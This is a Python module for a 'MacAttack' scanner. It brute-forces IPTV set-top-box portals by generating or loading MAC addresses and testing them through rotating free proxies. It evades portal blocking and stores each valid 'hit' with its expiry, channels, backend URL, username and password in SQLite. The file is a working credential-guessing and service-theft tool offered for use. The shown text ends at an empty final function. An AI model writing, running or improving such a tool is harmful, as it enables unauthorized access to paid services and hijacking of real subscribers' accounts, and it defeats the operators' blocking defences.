"""
MAC Scanner Module
Integriert MacAttack Scanner in MacReplayXC
Full Feature Set from MacAttackWeb-NEW
Storage: Hybrid (Settings in JSON, Hits in SQLite DB)
Performance: DNS Caching, Connection Pooling, Batch Writes, orjson
"""
import threading
import time
import secrets
import random
import os
import json
import sqlite3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import logging
import socket
from functools import lru_cache
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

import stb

logger = logging.getLogger(__name__)

# ============== PERFORMANCE OPTIMIZATIONS ==============

# 1. DNS Caching (2-5x speedup for same portals)
_original_getaddrinfo = socket.getaddrinfo

@lru_cache(maxsize=1000)
def cached_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
    """Cached DNS lookups to avoid repeated DNS queries"""
    return _original_getaddrinfo(host, port, family, type, proto, flags)

# Monkey-patch socket for DNS caching
socket.getaddrinfo = cached_getaddrinfo
logger.info("DNS caching enabled (1000 entries)")

# 2. HTTP Connection Pooling (1.5-5x speedup)
http_session = requests.Session()
retry_strategy = Retry(
    total=2,
    backoff_factor=0.1,
    status_forcelist=[429, 500, 502, 503, 504]
)
adapter = HTTPAdapter(
    pool_connections=20,    # 20 connection pools
    pool_maxsize=100,       # Max 100 connections per pool
    max_retries=retry_strategy
)
http_session.mount("http://", adapter)
http_session.mount("https://", adapter)
logger.info("HTTP connection pooling enabled (20 pools, 100 connections)")

# 3. orjson for fast JSON parsing (5-10x speedup)
try:
    import orjson
    JSON_LOADS = lambda x: orjson.loads(x)
    JSON_DUMPS = lambda x: orjson.dumps(x).decode('utf-8')
    logger.info("Using orjson for fast JSON parsing (10x speedup)")
except ImportError:
    JSON_LOADS = json.loads
    JSON_DUMPS = lambda x: json.dumps(x, indent=2)
    logger.warning("orjson not available, using standard json (consider: pip install orjson)")

# Global state
scanner_attacks = {}
scanner_attacks_lock = threading.Lock()

# Resource limits
MAX_CONCURRENT_SCANS = 5
MAX_RETRY_QUEUE_SIZE = 1000
BATCH_WRITE_SIZE = 100          # Batch DB writes for performance
BATCH_WRITE_INTERVAL = 5        # Flush batch every 5 seconds

# Scanner config file (Settings, Proxies, Sources)
SCANNER_CONFIG_FILE = os.path.join(os.getenv("CONFIG", "/app/data").replace("MacReplayXC.json", ""), "scanner_config.json")

# Scanner database file (Found MACs)
SCANNER_DB_FILE = os.path.join(os.getenv("CONFIG", "/app/data").replace("MacReplayXC.json", ""), "scans.db")

# Default scanner settings
DEFAULT_SCANNER_SETTINGS = {
    "speed": 10,
    "timeout": 10,
    "mac_prefix": "00:1A:79:",
    "auto_save": True,
    "max_proxy_errors": 10,
    "proxy_test_threads": 50,
    "unlimited_mac_retries": True,
    "max_mac_retries": 3,
    "max_proxy_attempts_per_mac": 10,
    "proxy_rotation_percentage": 80,
    "proxy_connect_timeout": 2,
    "require_channels_for_valid_hit": True,
    "min_channels_for_valid_hit": 1,
    "aggressive_phase1_retry": True,
}

# Scanner persistent data (Settings only, Hits in DB)
scanner_data = {
    "settings": DEFAULT_SCANNER_SETTINGS.copy(),
    "proxies": [],
    "proxy_sources": [
        "https://spys.me/proxy.txt",
        "https://free-proxy-list.net/",
    ],
}

# Proxy state
proxy_state = {
    "fetching": False,
    "testing": False,
    "proxies": [],
    "working_proxies": [],
    "failed_proxies": [],
    "logs": []
}


# ============== DATABASE MANAGEMENT ==============

def init_scanner_db():
    """Initialize scanner database with performance optimizations"""
    try:
        conn = sqlite3.connect(SCANNER_DB_FILE)
        
        # Performance optimizations
        conn.execute('PRAGMA journal_mode=WAL')        # Write-Ahead Logging (bessere Concurrency)
        conn.execute('PRAGMA synchronous=NORMAL')      # Schneller, aber sicher
        conn.execute('PRAGMA cache_size=-64000')       # 64MB Cache
        conn.execute('PRAGMA temp_store=MEMORY')       # Temp tables in RAM
        
        cursor = conn.cursor()
        
        # Create found_macs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS found_macs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac TEXT NOT NULL,
                portal TEXT NOT NULL,
                expiry TEXT,
                channels INTEGER DEFAULT 0,
                has_de BOOLEAN DEFAULT 0,
                backend_url TEXT,
                username TEXT,
                password TEXT,
                max_connections INTEGER,
                created_at TEXT,
                client_ip TEXT,
                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(mac, portal)
            )
        ''')
        
        # Create indices for fast queries
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_portal ON found_macs(portal)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_has_de ON found_macs(has_de)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_channels ON found_macs(channels)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_found_at ON found_macs(found_at)')
        
        # Create genres table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS genres (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_id INTEGER NOT NULL,
                genre TEXT NOT NULL,
                is_de BOOLEAN DEFAULT 0,
                FOREIGN KEY (mac_id) REFERENCES found_macs(id) ON DELETE CASCADE
            )
        ''')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_mac_id ON genres(mac_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_de ON genres(is_de)')
        
        conn.commit()
        conn.close()
        logger.info("Scanner database initialized")
    except Exception as e:
        logger.error(f"Error initializing scanner database: {e}")


def get_db_connection():
    """Get database connection"""
    conn = sqlite3.connect(SCANNER_DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn


# ============== CONFIG MANAGEMENT ==============

def load_scanner_config():
    """Load scanner config from file (Settings only)"""
    global scanner_data
    try:
        if os.path.exists(SCANNER_CONFIG_FILE):
            with open(SCANNER_CONFIG_FILE, 'r') as f:
                loaded = JSON_LOADS(f.read())
                # Only load settings, proxies, sources (NOT found_macs)
                if "settings" in loaded:
                    scanner_data["settings"] = loaded["settings"]
                if "proxies" in loaded:
                    scanner_data["proxies"] = loaded["proxies"]
                if "proxy_sources" in loaded:
                    scanner_data["proxy_sources"] = loaded["proxy_sources"]
                logger.info("Loaded scanner config")
    except Exception as e:
        logger.error(f"Error loading scanner config: {e}")


def save_scanner_config():
    """Save scanner config to file (Settings only)"""
    try:
        os.makedirs(os.path.dirname(SCANNER_CONFIG_FILE), exist_ok=True)
        with open(SCANNER_CONFIG_FILE, 'w') as f:
            # Only save settings, proxies, sources (NOT found_macs)
            config_to_save = {
                "settings": scanner_data.get("settings", {}),
                "proxies": scanner_data.get("proxies", []),
                "proxy_sources": scanner_data.get("proxy_sources", [])
            }
            f.write(JSON_DUMPS(config_to_save))
        logger.info("Saved scanner config")
    except Exception as e:
        logger.error(f"Error saving scanner config: {e}")


def get_scanner_settings():
    """Get scanner settings"""
    return scanner_data.get("settings", DEFAULT_SCANNER_SETTINGS.copy())


def update_scanner_settings(new_settings):
    """Update scanner settings"""
    scanner_data["settings"].update(new_settings)
    save_scanner_config()


def add_found_mac(hit_data):
    """Add found MAC to database"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Insert or replace MAC
        cursor.execute('''
            INSERT OR REPLACE INTO found_macs 
            (mac, portal, expiry, channels, has_de, backend_url, username, password, 
             max_connections, created_at, client_ip, found_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            hit_data['mac'],
            hit_data['portal'],
            hit_data.get('expiry'),
            hit_data.get('channels', 0),
            hit_data.get('has_de', False),
            hit_data.get('backend_url'),
            hit_data.get('username'),
            hit_data.get('password'),
            hit_data.get('max_connections'),
            hit_data.get('created_at'),
            hit_data.get('client_ip'),
            hit_data.get('found_at', datetime.now().isoformat())
        ))
        
        mac_id = cursor.lastrowid
        
        # Delete old genres
        cursor.execute('DELETE FROM genres WHERE mac_id = ?', (mac_id,))
        
        # Insert genres
        for genre in hit_data.get('genres', []):
            is_de = 'DE' in genre.upper() or 'GERMAN' in genre.upper() or 'DEUTSCH' in genre.upper()
            cursor.execute('''
                INSERT INTO genres (mac_id, genre, is_de)
                VALUES (?, ?, ?)
            ''', (mac_id, genre, is_de))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Added found MAC to database: {hit_data['mac']}")
    except Exception as e:
        logger.error(f"Error adding found MAC to database: {e}")


def get_found_macs(portal=None, min_channels=0, de_only=False, limit=None):
    """Get found MACs from database with optional filters"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        query = 'SELECT * FROM found_macs WHERE 1=1'
        params = []
        
        if portal:
            query += ' AND portal = ?'
            params.append(portal)
        
        if min_channels > 0:
            query += ' AND channels >= ?'
            params.append(min_channels)
        
        if de_only:
            query += ' AND has_de = 1'
        
        query += ' ORDER BY found_at DESC'
        
        if limit:
            query += ' LIMIT ?'
            params.append(limit)
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        
        # Convert to dict and add genres
        results = []
        for row in rows:
            hit = dict(row)
            
            # Get genres
            cursor.execute('SELECT genre FROM genres WHERE mac_id = ? ORDER BY is_de DESC', (hit['id'],))
            hit['genres'] = [g[0] for g in cursor.fetchall()]
            
            # Get DE genres
            cursor.execute('SELECT genre FROM genres WHERE mac_id = ? AND is_de = 1', (hit['id'],))
            hit['de_genres'] = [g[0] for g in cursor.fetchall()]
            
            # Remove internal id
            del hit['id']
            
            results.append(hit)
        
        conn.close()
        return results
    except Exception as e:
        logger.error(f"Error getting found MACs from database: {e}")
        return []


def get_found_macs_stats():
    """Get statistics about found MACs"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT 
                COUNT(*) as total_hits,
                COUNT(DISTINCT portal) as unique_portals,
                SUM(CASE WHEN has_de = 1 THEN 1 ELSE 0 END) as de_hits,
                AVG(channels) as avg_channels,
                MAX(channels) as max_channels,
                MIN(found_at) as first_hit,
                MAX(found_at) as last_hit
            FROM found_macs
        ''')
        
        row = cursor.fetchone()
        stats = dict(row) if row else {}
        
        conn.close()
        return stats
    except Exception as e:
        logger.error(f"Error getting found MACs stats: {e}")
        return {}


def get_portals_list():
    """Get list of unique portals"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT portal, COUNT(*) as hits
            FROM found_macs
            GROUP BY portal
            ORDER BY hits DESC
        ''')
        
        portals = [{"portal": row[0], "hits": row[1]} for row in cursor.fetchall()]
        
        conn.close()
        return portals
    except Exception as e:
        logger.error(f"Error getting portals list: {e}")
        return []


def clear_found_macs():
    """Clear all found MACs from database"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM found_macs')
        cursor.execute('DELETE FROM genres')
        
        conn.commit()
        conn.close()
        
        logger.info("Cleared all found MACs from database")
    except Exception as e:
        logger.error(f"Error clearing found MACs: {e}")


# ============== BATCH WRITER FOR PERFORMANCE ==============

class BatchWriter:
    """Batch writer for database inserts (10-50x faster than individual writes)"""
    
    def __init__(self, batch_size=BATCH_WRITE_SIZE, flush_interval=BATCH_WRITE_INTERVAL):
        self.batch = []
        self.batch_size = batch_size
        self.flush_interval = flush_interval
        self.last_flush = time.time()
        self.lock = threading.Lock()
        self.total_written = 0
        logger.info(f"Batch writer initialized (size={batch_size}, interval={flush_interval}s)")
    
    def add(self, hit_data):
        """Add hit to batch (will auto-flush when full or timeout)"""
        with self.lock:
            self.batch.append(hit_data)
            
            # Auto-flush if batch full or timeout
            if len(self.batch) >= self.batch_size or \
               time.time() - self.last_flush > self.flush_interval:
                self.flush()
    
    def flush(self):
        """Write batch to database"""
        if not self.batch:
            return
        
        batch_to_write = self.batch.copy()
        self.batch.clear()
        self.last_flush = time.time()
        
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            # Begin transaction for batch
            cursor.execute('BEGIN TRANSACTION')
            
            for hit_data in batch_to_write:
                # Insert MAC
                cursor.execute('''
                    INSERT OR REPLACE INTO found_macs 
                    (mac, portal, expiry, channels, has_de, backend_url, username, password, 
                     max_connections, created_at, client_ip, found_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    hit_data['mac'],
                    hit_data['portal'],
                    hit_data.get('expiry'),
                    hit_data.get('channels', 0),
                    hit_data.get('has_de', False),
                    hit_data.get('backend_url'),
                    hit_data.get('username'),
                    hit_data.get('password'),
                    hit_data.get('max_connections'),
                    hit_data.get('created_at'),
                    hit_data.get('client_ip'),
                    hit_data.get('found_at', datetime.now().isoformat())
                ))
                
                mac_id = cursor.lastrowid
                
                # Delete old genres
                cursor.execute('DELETE FROM genres WHERE mac_id = ?', (mac_id,))
                
                # Insert genres (batch)
                genres_data = []
                for genre in hit_data.get('genres', []):
                    is_de = 'DE' in genre.upper() or 'GERMAN' in genre.upper() or 'DEUTSCH' in genre.upper()
                    genres_data.append((mac_id, genre, is_de))
                
                if genres_data:
                    cursor.executemany('''
                        INSERT INTO genres (mac_id, genre, is_de)
                        VALUES (?, ?, ?)
                    ''', genres_data)
            
            cursor.execute('COMMIT')
            self.total_written += len(batch_to_write)
            logger.info(f"Batch flushed: {len(batch_to_write)} hits written (total: {self.total_written})")
            
            conn.close()
        except Exception as e:
            logger.error(f"Batch write error: {e}")
            try:
                cursor.execute('ROLLBACK')
            except:
                pass
    
    def __del__(self):
        """Flush remaining batch on cleanup"""
        self.flush()


# Global batch writer instance
batch_writer = BatchWriter()


# Initialize database and load config on module import
init_scanner_db()
load_scanner_config()


# ============== RESOURCE MANAGEMENT ==============

def cleanup_old_attacks():
    """Remove old/finished attacks from memory to prevent memory leaks"""
    with scanner_attacks_lock:
        current_time = time.time()
        to_remove = []
        
        for attack_id, state in scanner_attacks.items():
            # Remove attacks that finished more than 1 hour ago
            if not state["running"] and current_time - state["start_time"] > 3600:
                to_remove.append(attack_id)
        
        for attack_id in to_remove:
            del scanner_attacks[attack_id]
            logger.info(f"Cleaned up old attack: {attack_id}")
    
    # Schedule next cleanup in 5 minutes
    threading.Timer(300, cleanup_old_attacks).start()


# Start cleanup timer
cleanup_old_attacks()


# ============== PROXY SCORER ==============

class ProxyScorer:
    """Track proxy performance for smart rotation"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.scores = {}
        self.round_robin_index = 0
    
    def _init_proxy(self, proxy):
        if proxy not in self.scores:
            self.scores[proxy] = {
                "speed": 5000,
                "success": 0,
                "fail": 0,
                "slow": 0,
                "blocked": set(),
                "last_used": 0,
                "consecutive_fails": 0
            }
    
    def record_success(self, proxy, response_time_ms):
        """Record successful request"""
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            if s["success"] > 0:
                s["speed"] = s["speed"] * 0.7 + response_time_ms * 0.3
            else:
                s["speed"] = response_time_ms
            s["success"] += 1
            s["consecutive_fails"] = 0
    
    def record_fail(self, proxy, error_type, portal=None):
        """Record failed request"""
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            s["fail"] += 1
            s["consecutive_fails"] += 1
            
            if error_type == "slow":
                s["slow"] += 1
                s["speed"] = min(s["speed"] * 1.1, 15000)
            elif error_type == "blocked" and portal:
                s["blocked"].add(portal)
            elif error_type == "dead":
                s["speed"] = min(s["speed"] * 1.3, 20000)
    
    def get_next_proxy(self, proxies, portal=None, max_errors=10, rotation_percentage=80):
        """Smart proxy rotation"""
        with self.lock:
            valid = []
            for p in proxies:
                self._init_proxy(p)
                s = self.scores[p]
                
                if portal and portal in s["blocked"]:
                    continue
                if s["consecutive_fails"] >= max_errors:
                    continue
                
                score = self._get_score(p, portal)
                if score < float('inf'):
                    valid.append((p, score))
            
            if not valid:
                return None
            
            valid.sort(key=lambda x: x[1])
            top_count = max(5, int(len(valid) * rotation_percentage / 100))
            top_proxies = valid[:top_count]
            
            self.round_robin_index = (self.round_robin_index + 1) % len(top_proxies)
            chosen = top_proxies[self.round_robin_index][0]
            self.scores[chosen]["last_used"] = time.time()
            
            return chosen
    
    def _get_score(self, proxy, portal=None):
        """Calculate proxy score (lower = better)"""
        if proxy not in self.scores:
            return 5000
        
        s = self.scores[proxy]
        if portal and portal in s["blocked"]:
            return float('inf')
        if s["consecutive_fails"] >= 10:
            return float('inf')
        
        score = s["speed"]
        total = s["success"] + s["fail"]
        if total > 0:
            fail_rate = s["fail"] / total
            score *= (1 + fail_rate * 2)
        
        if s["slow"] > 3:
            score *= 1.5
        
        return score
    
    def get_working_count(self, proxies, portal=None, max_errors=10):
        """Count how many proxies are still working"""
        count = 0
        with self.lock:
            for p in proxies:
                if p not in self.scores:
                    count += 1
                    continue
                s = self.scores[p]
                if portal and portal in s["blocked"]:
                    continue
                if s["consecutive_fails"] >= max_errors:
                    continue
                count += 1
        return count
    
    def rehabilitate_dead_proxies(self, max_age_minutes=10):
        """Reset proxies that have been 'dead' for too long"""
        with self.lock:
            current_time = time.time()
            rehabilitated = 0
            for proxy, s in self.scores.items():
                if (s["consecutive_fails"] >= 10 and
                    current_time - s.get("last_used", 0) > max_age_minutes * 60):
                    s["consecutive_fails"] = 3
                    s["speed"] = min(s["speed"], 15000)
                    rehabilitated += 1
            return rehabilitated
    
    def get_stats(self, portal=None):
        """Get proxy statistics"""
        with self.lock:
            total = len(self.scores)
            active = 0
            blocked = 0
            dead = 0
            
            for s in self.scores.values():
                if portal and portal in s["blocked"]:
                    blocked += 1
                elif s["consecutive_fails"] >= 10:
                    dead += 1
                else:
                    active += 1
            
            return {"total": total, "active": active, "blocked": blocked, "dead": dead}
    
    def reset(self):
        """Reset all scores"""
        with self.lock:
            self.scores.clear()
            self.round_robin_index = 0
    
    def reset_consecutive_fails(self):
        """Reset consecutive fails (for resume after pause)"""
        with self.lock:
            for s in self.scores.values():
                s["consecutive_fails"] = 0


# Global proxy scorer
proxy_scorer = ProxyScorer()


# ============== SCANNER FUNCTIONS ==============

def generate_mac(prefix="00:1A:79:"):
    """Generate random MAC address"""
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"


def create_scanner_state(portal_url, mode="random", mac_list=None, proxies=None, settings=None):
    """Create scanner attack state"""
    
    # Handle refresh mode: Load MACs from database for this portal
    if mode == "refresh":
        portal_norm = portal_url.rstrip('/').lower()
        found_macs = get_found_macs(portal=portal_url)
        mac_list = [m["mac"] for m in found_macs]
        logger.info(f"Refresh mode: {len(mac_list)} MACs loaded from database for portal {portal_url}")
    
    return {
        "id": secrets.token_hex(4),
        "running": True,
        "paused": False,
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "current_proxy": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "mode": mode,
        "mac_list": mac_list or [],
        "mac_list_index": 0,
        "scanned_macs": set(),
        "proxies": proxies or [],
        "settings": settings or {},
    }


def add_scanner_log(state, message, level="info"):
    """Add log entry to scanner state"""
    ts = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({"time": ts, "level": level, "message": message})
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]


def run_scanner_attack(attack_id):
    """Main scanner loop with full MacAttackWeb-NEW features"""
    with scanner_attacks_lock:
        if attack_id not in scanner_attacks:
            return
        state = scanner_attacks[attack_id]
    
    portal_url = state["portal_url"]
    mode = state["mode"]
    mac_list = state["mac_list"]
    proxies = state["proxies"]
    settings = state["settings"]
    
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = len(proxies) > 0
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    max_proxy_errors = settings.get("max_proxy_errors", 10)
    unlimited_retries = settings.get("unlimited_mac_retries", True)
    max_retries = settings.get("max_mac_retries", 3)
    max_proxy_attempts = settings.get("max_proxy_attempts_per_mac", 10)
    require_channels = settings.get("require_channels_for_valid_hit", True)
    min_channels = settings.get("min_channels_for_valid_hit", 1)
    
    add_scanner_log(state, f"Started: {speed} threads, mode={mode}", "info")
    
    # Log MAC list info for list/refresh modes
    if mode in ("list", "refresh"):
        add_scanner_log(state, f"MAC list: {len(mac_list)} MACs to scan", "info")
    
    if use_proxies:
        add_scanner_log(state, f"Using {len(proxies)} proxies with smart rotation", "info")
        proxy_scorer.reset()
        proxy_scorer.reset_consecutive_fails()
    
    mac_index = 0
    retry_queue = []  # (mac, retry_count, last_proxy)
    list_done = False
    last_settings_reload = time.time()
    last_rehabilitation = time.time()
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}
        
        while state["running"]:
            # Handle pause
            while state["paused"] and state["running"]:
                time.sleep(0.5)
                if use_proxies:
                    if state.get("auto_paused"):
                        proxy_scorer.reset_consecutive_fails()
                        working = proxy_scorer.get_working_count(proxies, portal_url, max_proxy_errors)
                        if working > 0:
                            state["paused"] = False
                            state["auto_paused"] = False
                            add_scanner_log(state, f"Resumed - {working} proxies available", "info")
            
            if not state["running"]:
                break
            
            # Periodic proxy rehabilitation (every 3 minutes)
            if time.time() - last_rehabilitation > 180:
                if use_proxies and proxies:
                    rehabilitated = proxy_scorer.rehabilitate_dead_proxies()
                    if rehabilitated > 0:
                        add_scanner_log(state, f"♻️ Rehabilitated {rehabilitated} dead proxies", "info")
                last_rehabilitation = time.time()
            
            # Reload settings every 5 seconds
            if time.time() - last_settings_reload > 5:
                settings = get_scanner_settings()
                timeout = settings.get("timeout", 10)
                max_proxy_errors = settings.get("max_proxy_errors", 10)
                unlimited_retries = settings.get("unlimited_mac_retries", True)
                max_retries = settings.get("max_mac_retries", 3)
                max_proxy_attempts = settings.get("max_proxy_attempts_per_mac", 10)
                require_channels = settings.get("require_channels_for_valid_hit", True)
                min_channels = settings.get("min_channels_for_valid_hit", 1)
                last_settings_reload = time.time()
            
            # Update proxy stats
            if use_proxies:
                state["proxy_stats"] = proxy_scorer.get_stats(portal_url)
                state["proxy_stats"]["total_configured"] = len(proxies)
            
            # Check if list exhausted
            if mode in ("list", "refresh") and mac_index >= len(mac_list) and not retry_queue:
                if not list_done:
                    add_scanner_log(state, f"List exhausted ({mac_index} MACs submitted)", "info")
                    list_done = True
                if not futures:
                    break
            
            # Check if proxies available
            if use_proxies:
                working_count = proxy_scorer.get_working_count(proxies, portal_url, max_proxy_errors)
                if working_count == 0 and not state.get("auto_paused"):
                    add_scanner_log(state, "⚠ No working proxies! Auto-pausing.", "warning")
                    state["paused"] = True
                    state["auto_paused"] = True
                    continue
            
            # Submit new MACs
            while len(futures) < speed and state["running"] and (not list_done or retry_queue):
                mac = None
                retry_count = 0
                last_proxy = None
                
                # Priority 1: Retry queue (soft-fail MACs)
                if retry_queue:
                    mac, retry_count, last_proxy = retry_queue.pop(0)
                # Priority 2: New MACs from list or refresh
                elif mode in ("list", "refresh") and mac_index < len(mac_list):
                    mac = mac_list[mac_index]
                    mac_index += 1
                    state["mac_list_index"] = mac_index
                # Priority 3: Random MACs
                elif mode == "random":
                    mac = generate_mac(mac_prefix)
                    attempts = 0
                    while mac in state["scanned_macs"] and attempts < 100:
                        mac = generate_mac(mac_prefix)
                        attempts += 1
                    state["scanned_macs"].add(mac)
                else:
                    break
                
                if not mac:
                    break
                
                # Get proxy
                proxy = None
                if use_proxies and proxies:
                    proxy = proxy_scorer.get_next_proxy(
                        proxies, portal_url, max_proxy_errors,
                        settings.get("proxy_rotation_percentage", 80)
                    )
                    
                    # Avoid same proxy that just failed
                    if proxy == last_proxy and len(proxies) > 1:
                        for attempt in range(min(10, len(proxies))):
                            alt = proxy_scorer.get_next_proxy(
                                proxies, portal_url, max_proxy_errors,
                                settings.get("proxy_rotation_percentage", 80)
                            )
                            if alt and alt != last_proxy:
                                proxy = alt
                                break
                    
                    if not proxy:
                        if mac not in [r[0] for r in retry_queue]:
                            retry_queue.append((mac, retry_count, None))
                        if not state.get("auto_paused"):
                            add_scanner_log(state, "⚠ No working proxies! Auto-pausing.", "warning")
                            state["paused"] = True
                            state["auto_paused"] = True
                        break
                    
                    state["current_proxy"] = proxy
                
                state["current_mac"] = mac
                
                future = executor.submit(
                    test_mac_scanner, portal_url, mac, proxy, timeout,
                    settings.get("proxy_connect_timeout", 2),
                    require_channels, min_channels
                )
                futures[future] = (mac, proxy, retry_count, time.time())
            
            # Process completed futures
            done = [f for f in futures if f.done()]
            
            for future in done:
                mac, proxy, retry_count, start_time = futures.pop(future)
                elapsed_ms = (time.time() - start_time) * 1000
                
                try:
                    success, result, error_type = future.result()
                    
                    if success:
                        # HIT!
                        state["tested"] += 1
                        state["hits"] += 1
                        
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        
                        expiry = result.get("expiry", "Unknown")
                        channels = result.get("channels", 0)
                        genres = result.get("genres", [])
                        
                        de_genres = [g for g in genres if "DE" in g.upper() or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                        has_de = len(de_genres) > 0
                        
                        hit_data = {
                            "mac": mac,
                            "portal": portal_url,
                            "expiry": expiry,
                            "channels": channels,
                            "genres": genres,
                            "has_de": has_de,
                            "de_genres": de_genres,
                            "backend_url": result.get("backend_url"),
                            "username": result.get("username"),
                            "password": result.get("password"),
                            "max_connections": result.get("max_connections"),
                            "created_at": result.get("created_at"),
                            "client_ip": result.get("client_ip"),
                            "found_at": datetime.now().isoformat(),
                        }
                        
                        state["found_macs"].append(hit_data)
                        
                        # Save to persistent storage (batch write for performance)
                        batch_writer.add(hit_data)
                        
                        de_icon = " 🇩🇪" if has_de else ""
                        add_scanner_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon}", "success")
                    
                    elif error_type:
                        # Proxy error - retry MAC with different proxy
                        if proxy:
                            proxy_scorer.record_fail(proxy, error_type, portal_url)
                        
                        new_retry_count = retry_count + 1
                        
                        # Determine if we should retry
                        if unlimited_retries:
                            should_retry = True
                        else:
                            max_attempts = max(max_proxy_attempts, max_retries)
                            should_retry = new_retry_count < max_attempts
                        
                        if error_type == "dead":
                            add_scanner_log(state, f"💀 Proxy dead: {proxy}", "error")
                        elif error_type == "blocked":
                            add_scanner_log(state, f"🚫 Proxy blocked: {proxy}", "error")
                        elif error_type == "slow" and new_retry_count <= 2:
                            add_scanner_log(state, f"⏱ Timeout {mac}, retry queued", "warning")
                        
                        if should_retry:
                            # Limit retry queue size to prevent memory issues
                            if len(retry_queue) < MAX_RETRY_QUEUE_SIZE:
                                retry_queue.append((mac, new_retry_count, proxy))
                                if new_retry_count <= 3:
                                    add_scanner_log(state, f"🔄 Retry {new_retry_count}: {mac}", "warning")
                            else:
                                # Queue full - drop oldest entries
                                retry_queue.pop(0)
                                retry_queue.append((mac, new_retry_count, proxy))
                        else:
                            state["tested"] += 1
                            state["errors"] += 1
                            add_scanner_log(state, f"✗ {mac} - tried {new_retry_count} proxies, giving up", "error")
                    
                    else:
                        # Portal validation failed (invalid MAC or not enough channels)
                        state["tested"] += 1
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        
                        error_msg = result.get("error", "Invalid MAC")
                        if "channels" in error_msg.lower():
                            add_scanner_log(state, f"📺 {mac} - {error_msg}", "warning")
                
                except Exception as e:
                    state["errors"] += 1
                    new_retry_count = retry_count + 1
                    
                    if unlimited_retries:
                        should_retry = True
                    else:
                        max_attempts = max(max_proxy_attempts, max_retries)
                        should_retry = new_retry_count < max_attempts
                    
                    if should_retry:
                        # Limit retry queue size to prevent memory issues
                        if len(retry_queue) < MAX_RETRY_QUEUE_SIZE:
                            retry_queue.append((mac, new_retry_count, proxy))
                            if new_retry_count <= 3:
                                add_scanner_log(state, f"🔄 Retry {new_retry_count}: {mac} (worker error)", "warning")
                        else:
                            # Queue full - drop oldest entries
                            retry_queue.pop(0)
                            retry_queue.append((mac, new_retry_count, proxy))
                    else:
                        state["tested"] += 1
                        add_scanner_log(state, f"✗ {mac} - tried {new_retry_count} proxies, giving up", "error")
                    logger.error(f"Scanner worker error: {e}")
            
            time.sleep(0.02)
    
    state["running"] = False
    
    if use_proxies:
        stats = proxy_scorer.get_stats(portal_url)
        add_scanner_log(state, f"Proxy stats: {stats['active']} active, {stats['blocked']} blocked, {stats['dead']} dead", "info")
    
    add_scanner_log(state, f"✓ Done. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")


def test_mac_scanner(portal_url, mac, proxy, timeout, connect_timeout=2, require_channels=True, min_channels=1):
    """Test MAC with channel validation - wrapper for stb.test_mac"""
    try:
        # Use existing stb.test_mac if available
        if hasattr(stb, 'test_mac'):
            success, result = stb.test_mac(portal_url, mac, proxy, timeout, connect_timeout, require_channels, min_channels)
            return success, result, None
        else:
            # Fallback: basic test using existing stb functions
            token = stb.getToken(portal_url, mac, proxy)
            if not token:
                return False, {"mac": mac, "error": "No token"}, None
            
            stb.getProfile(portal_url, mac, token, proxy)
            expiry = stb.getExpires(portal_url, mac, token, proxy)
            
            if not expiry:
                return False, {"mac": mac, "error": "No expiry"}, None
            
            # Get channels
            channels = stb.getAllChannels(portal_url, mac, token, proxy)
            genres = stb.getGenreNames(portal_url, mac, token, proxy)
            
            channel_count = len(channels) if channels else 0
            
            # Channel validation
            if require_channels and channel_count < min_channels:
                return False, {
                    "mac": mac,
                    "error": f"Only {channel_count} channels (minimum: {min_channels})"
                }, None
            
            result = {
                "mac": mac,
                "expiry": expiry,
                "channels": channel_count,
                "genres": list(genres.values()) if genres else [],
            }
            
            return True, result, None
            
    except Exception as e:
        error_str = str(e).lower()
        if "timeout" in error_str or "timed out" in error_str:
            return False, {"mac": mac}, "slow"
        elif "refused" in error_str or "unreachable" in error_str:
            return False, {"mac": mac}, "dead"
        elif "403" in error_str or "blocked" in error_str:
            return False, {"mac": mac}, "blocked"
        else:
            logger.error(f"test_mac error: {e}")
            return False, {"mac": mac}, "unknown"


def generate_portal_name_from_hit(hit_data):
    """Generate portal name from hit data"""
